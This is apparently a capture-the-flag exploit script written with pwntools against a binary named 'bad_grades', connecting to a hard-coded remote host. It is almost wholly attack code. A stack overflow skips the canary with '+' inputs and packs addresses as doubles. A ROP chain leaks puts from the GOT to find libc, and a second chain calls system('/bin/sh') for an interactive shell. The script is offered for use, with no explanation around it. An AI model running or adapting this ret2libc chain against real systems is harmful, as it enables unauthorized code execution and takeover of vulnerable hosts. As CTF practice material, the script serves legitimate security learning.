from pwn import *
from Crypto.Util.number import long_to_bytes
from struct import *

# context.log_level = 'debug'
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x401107
continue
'''.format(**locals())

exe = './challenge/bad_grades'
libc = ELF('./challenge/libc.so.6', checksec=False)
elf = context.binary = ELF(exe, checksec=False)
# p = start()
p = remote("139.59.180.127", 32391)

# ===== Exploit script here =====
pop_rdi_ret = 0x0000000000401263
ret = 0x0000000000400666
def h2d(val):
    val = p64(val).hex()
    val = struct.unpack('d', bytes.fromhex(val))[0]
    return str(val).encode()

print(p.recvline().decode())
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'39')
for i in range(35): p.sendlineafter(b': ', b'+')
p.sendlineafter(b': ', h2d(pop_rdi_ret))
p.sendlineafter(b': ', h2d(elf.got.puts))
p.sendlineafter(b': ', h2d(elf.plt.puts))
p.sendlineafter(b': ', h2d(elf.entrypoint)); p.recvline()
leak = int.from_bytes(p.recvline()[:-1], 'little')
info("Leak: " + hex(leak))
libc.address = leak - libc.sym.puts

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'39')
for i in range(35): p.sendlineafter(b': ', b'+')
p.sendlineafter(b': ', h2d(pop_rdi_ret))
p.sendlineafter(b': ', h2d(next(libc.search(b'/bin/sh\x00'))))
p.sendlineafter(b': ', h2d(ret))
p.sendlineafter(b': ', h2d(libc.sym.system)); p.recvline()

p.interactive()